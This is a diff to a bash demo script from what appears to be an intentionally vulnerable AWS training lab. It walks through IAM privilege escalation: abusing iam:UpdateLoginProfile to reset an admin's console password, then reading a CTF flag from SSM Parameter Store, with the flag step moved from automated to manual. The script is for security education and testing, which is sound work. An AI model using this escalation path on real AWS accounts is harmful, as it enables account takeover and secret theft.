@@ -215,56 +215,19 @@ echo -e "${YELLOW}Step 8: Password has been successfully changed${NC}"
 echo "The admin user can now log in with the new password."
 echo -e "${GREEN}✓ Confirmed password update!${NC}\n"
 
-# [EXPLOIT] Step 9: Capture the CTF flag
-# This scenario grants console access to an admin user rather than creating programmatic
-# credentials. To demonstrate end-to-end flag capture in the automated demo, we use the
-# admin-for-cleanup credentials (also an admin-equivalent principal) to read the flag
-# from SSM Parameter Store — the same parameter an attacker logged in as the target user
-# would be able to read via the console or CLI session.
-echo -e "${YELLOW}Step 9: Capturing CTF flag from SSM Parameter Store${NC}"
-echo "Retrieving admin credentials to demonstrate flag access..."
-cd ../../../../../..  # Navigate to root of terraform project
-ADMIN_ACCESS_KEY_FOR_FLAG=$(OTEL_TRACES_EXPORTER= terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
-ADMIN_SECRET_KEY_FOR_FLAG=$(OTEL_TRACES_EXPORTER= terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)
-cd - > /dev/null
-
-if [ -z "$ADMIN_ACCESS_KEY_FOR_FLAG" ] || [ "$ADMIN_ACCESS_KEY_FOR_FLAG" == "null" ]; then
-    echo -e "${RED}Error: Could not retrieve admin credentials for flag capture${NC}"
-    exit 1
-fi
-
-export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY_FOR_FLAG"
-export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY_FOR_FLAG"
-unset AWS_SESSION_TOKEN
-export AWS_REGION=$AWS_REGION
-
-FLAG_PARAM_NAME="/pathfinding-labs/flags/iam-006-to-admin"
-show_attack_cmd "Admin (target user)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
-FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
-
-if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
-    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
-else
-    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
-    exit 1
-fi
-echo ""
-
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
+echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL — CONSOLE ACCESS OBTAINED${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (only iam:UpdateLoginProfile on admin user)"
 echo "2. Used iam:UpdateLoginProfile to change console password for $ADMIN_USER_NAME"
 echo "3. Gained Administrator Access (console login as $ADMIN_USER_NAME)"
-echo "4. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER → (iam:UpdateLoginProfile) → $ADMIN_USER_NAME (admin)"
-echo -e "  → (ssm:GetParameter) → CTF Flag"
 echo ""
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
@@ -280,6 +243,22 @@ echo -e "  URL: ${YELLOW}$CONSOLE_LOGIN_URL${NC}"
 echo -e "  Username: ${YELLOW}$ADMIN_USER_NAME${NC}"
 echo -e "  New Password: ${YELLOW}$NEW_PASSWORD${NC}"
 echo -e "  Original Password: ${YELLOW}$ORIGINAL_PASSWORD${NC} (saved for cleanup)"
+echo ""
+echo -e "${YELLOW}========================================${NC}"
+echo -e "${YELLOW}AUTOMATED DEMO ENDS HERE — CAPTURE THE FLAG MANUALLY${NC}"
+echo -e "${YELLOW}========================================${NC}"
+echo "The attacker now holds a working console password for $ADMIN_USER_NAME but no"
+echo "programmatic credentials exist for this user, so the automated demo cannot read"
+echo "the CTF flag on your behalf. Complete the scenario manually:"
+echo ""
+echo "  1. Open the Console URL above and sign in as $ADMIN_USER_NAME with the new password."
+echo "  2. From the console, open AWS CloudShell (top-right toolbar) and run:"
+echo ""
+echo -e "       ${CYAN}aws ssm get-parameter \\"
+echo -e "         --name /pathfinding-labs/flags/iam-006-to-admin \\"
+echo -e "         --query 'Parameter.Value' --output text${NC}"
+echo ""
+echo "     Or read the parameter directly via Systems Manager > Parameter Store."
 echo ""
 echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to restore the original password${NC}"
 echo ""
